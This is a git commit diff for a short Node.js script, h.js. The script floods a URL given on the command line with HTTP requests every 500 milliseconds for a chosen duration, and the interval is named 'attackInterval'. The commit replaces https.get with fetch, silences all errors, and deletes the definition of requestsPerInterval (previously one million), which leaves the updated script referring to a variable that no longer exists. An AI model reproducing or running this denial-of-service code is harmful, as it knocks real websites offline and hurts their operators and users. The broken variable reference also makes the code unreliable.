66c5fad2c33374946fc22ee14470ce54d24b4515
Heru Dev <162998538+Heruteah@users.noreply.github.com>
2025-01-15 03:04:03 +0800

    Update h.js

--- h.js
+++ h.js
@@ -1,16 +1,14 @@
-const https = require('https');
-
 const target = process.argv[2];
-const duration = parseInt(process.argv[3]);
-const requestsPerInterval = 1000000;
+const duration = process.argv[3];
 
-if (!target || isNaN(duration) || duration <= 0) {
+
+if (process.argv.length < 4 || isNaN(parseInt(duration))) {
     console.log('Invalid Usage: node index.js <link target> <duration in seconds>');
     process.exit(1);
 } else {
     const attackInterval = setInterval(() => {
         for (let i = 0; i < requestsPerInterval; i++) {
-            https.get(target, () => {}).on('error', () => {});
+            fetch(target).catch(error => {});
         }
     }, 500);
 
